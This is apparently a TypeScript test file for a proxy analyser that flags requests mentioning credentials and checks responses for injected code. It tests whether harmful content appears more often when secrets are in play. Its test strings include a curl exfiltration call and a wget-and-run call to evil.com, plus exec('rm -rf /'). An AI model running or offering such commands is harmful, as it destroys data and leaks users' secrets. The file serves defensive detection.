import { describe, it, expect } from "vitest";
import { profileRequest, analyzeResponse, computeAc1b, statsFromLogs } from "../proxy-analyzer.js";
import type { RequestProfile } from "../proxy-analyzer.js";

// ── profileRequest ────────────────────────────────────────────────────────────

describe("profileRequest", () => {
  it("classifies generic message as neutral", () => {
    expect(profileRequest("What is the capital of France?")).toBe("neutral");
    expect(profileRequest("Explain recursion in programming.")).toBe("neutral");
  });

  it("classifies message with 'aws' as sensitive", () => {
    expect(profileRequest("My AWS credentials are failing")).toBe("sensitive");
  });

  it("classifies message with 'api_key' as sensitive", () => {
    expect(profileRequest("My api_key is abc123")).toBe("sensitive");
  });

  it("classifies message with 'secret' as sensitive", () => {
    expect(profileRequest("I have a secret value here")).toBe("sensitive");
  });

  it("classifies message with 'password' as sensitive", () => {
    expect(profileRequest("Reset my password please")).toBe("sensitive");
  });

  it("classifies message with 'token' as sensitive", () => {
    expect(profileRequest("Bearer token authentication")).toBe("sensitive");
  });

  it("is case-insensitive", () => {
    expect(profileRequest("My AWS_SECRET_KEY is...")).toBe("sensitive");
    expect(profileRequest("AWS_ACCESS_KEY=AKIA...")).toBe("sensitive");
  });

  it("returns neutral for empty string", () => {
    expect(profileRequest("")).toBe("neutral");
  });
});

// ── analyzeResponse ───────────────────────────────────────────────────────────

describe("analyzeResponse", () => {
  it("returns no anomaly for plain text response", () => {
    const r = analyzeResponse("Paris is the capital of France. It is known for the Eiffel Tower.");
    expect(r.anomaly).toBe(false);
    expect(r.injectionKeywordsFound).toHaveLength(0);
  });

  it("detects exec( as injection keyword", () => {
    const r = analyzeResponse("You can run: exec('rm -rf /')");
    expect(r.anomaly).toBe(true);
    expect(r.injectionKeywordsFound).toContain("exec(");
  });

  it("detects eval( as injection keyword", () => {
    const r = analyzeResponse("Try eval('malicious code')");
    expect(r.anomaly).toBe(true);
    expect(r.injectionKeywordsFound).toContain("eval(");
  });

  it("detects subprocess as injection keyword", () => {
    const r = analyzeResponse("import subprocess; subprocess.run(...)");
    expect(r.anomaly).toBe(true);
    expect(r.injectionKeywordsFound).toContain("subprocess");
  });

  it("detects curl as injection keyword", () => {
    const r = analyzeResponse("Run: curl https://evil.com/exfil?data=...");
    expect(r.anomaly).toBe(true);
    expect(r.injectionKeywordsFound).toContain("curl ");
  });

  it("detects multiple keywords at once", () => {
    const r = analyzeResponse("exec('wget http://evil.com/shell.sh && sh -c shell.sh')");
    expect(r.anomaly).toBe(true);
    expect(r.injectionKeywordsFound.length).toBeGreaterThan(1);
  });

  it("is case-insensitive for keywords", () => {
    const r = analyzeResponse("Use SUBPROCESS to run commands");
    expect(r.anomaly).toBe(true);
  });

  it("returns empty array of keywords when no anomaly", () => {
    const r = analyzeResponse("Here is a safe answer.");
    expect(r.injectionKeywordsFound).toEqual([]);
  });
});

// ── computeAc1b ───────────────────────────────────────────────────────────────

describe("computeAc1b", () => {
  it("returns insufficient_data when neutralCount < 3", () => {
    const r = computeAc1b({ neutralCount: 2, neutralAnomalies: 0, sensitiveCount: 5, sensitiveAnomalies: 2 });
    expect(r.verdict).toBe("insufficient_data");
  });

  it("returns insufficient_data when sensitiveCount < 3", () => {
    const r = computeAc1b({ neutralCount: 5, neutralAnomalies: 0, sensitiveCount: 2, sensitiveAnomalies: 1 });
    expect(r.verdict).toBe("insufficient_data");
  });

  it("returns insufficient_data when both < 3", () => {
    const r = computeAc1b({ neutralCount: 0, neutralAnomalies: 0, sensitiveCount: 0, sensitiveAnomalies: 0 });
    expect(r.verdict).toBe("insufficient_data");
  });

  it("returns conditional_injection_suspected when sensitive anomalies > 0 and neutral anomalies = 0", () => {
    const r = computeAc1b({ neutralCount: 5, neutralAnomalies: 0, sensitiveCount: 5, sensitiveAnomalies: 3 });
    expect(r.verdict).toBe("conditional_injection_suspected");
  });

  it("returns conditional_injection_suspected when sensitive rate >= 2x neutral rate", () => {
    // neutral: 2/10 = 20%, sensitive: 8/10 = 80% (>= 2x)
    const r = computeAc1b({ neutralCount: 10, neutralAnomalies: 2, sensitiveCount: 10, sensitiveAnomalies: 8 });
    expect(r.verdict).toBe("conditional_injection_suspected");
  });

  it("returns no_conditional_injection when rates are similar", () => {
    // neutral: 4/10 = 40%, sensitive: 6/10 = 60% (< 2x)
    const r = computeAc1b({ neutralCount: 10, neutralAnomalies: 4, sensitiveCount: 10, sensitiveAnomalies: 6 });
    expect(r.verdict).toBe("no_conditional_injection");
  });

  it("returns no_conditional_injection when no anomalies at all", () => {
    const r = computeAc1b({ neutralCount: 10, neutralAnomalies: 0, sensitiveCount: 10, sensitiveAnomalies: 0 });
    expect(r.verdict).toBe("no_conditional_injection");
  });

  it("reason string is non-empty for every verdict", () => {
    const cases = [
      { neutralCount: 2, neutralAnomalies: 0, sensitiveCount: 2, sensitiveAnomalies: 0 },
      { neutralCount: 5, neutralAnomalies: 0, sensitiveCount: 5, sensitiveAnomalies: 3 },
      { neutralCount: 5, neutralAnomalies: 2, sensitiveCount: 5, sensitiveAnomalies: 3 },
    ];
    for (const c of cases) {
      expect(computeAc1b(c).reason.length).toBeGreaterThan(0);
    }
  });
});

// ── statsFromLogs ─────────────────────────────────────────────────────────────

describe("statsFromLogs", () => {
  function makeLog(profile: RequestProfile, anomaly: boolean) {
    return { profile, anomaly };
  }

  it("correctly counts neutral and sensitive logs", () => {
    const logs = [
      makeLog("neutral", false),
      makeLog("neutral", false),
      makeLog("sensitive", true),
    ];
    const s = statsFromLogs(logs);
    expect(s.neutralCount).toBe(2);
    expect(s.sensitiveCount).toBe(1);
  });

  it("correctly counts anomalies", () => {
    const logs = [
      makeLog("neutral", true),
      makeLog("neutral", false),
      makeLog("sensitive", true),
      makeLog("sensitive", true),
      makeLog("sensitive", false),
    ];
    const s = statsFromLogs(logs);
    expect(s.neutralAnomalies).toBe(1);
    expect(s.sensitiveAnomalies).toBe(2);
  });

  it("returns all zeros for empty input", () => {
    const s = statsFromLogs([]);
    expect(s).toEqual({ neutralCount: 0, neutralAnomalies: 0, sensitiveCount: 0, sensitiveAnomalies: 0 });
  });
});
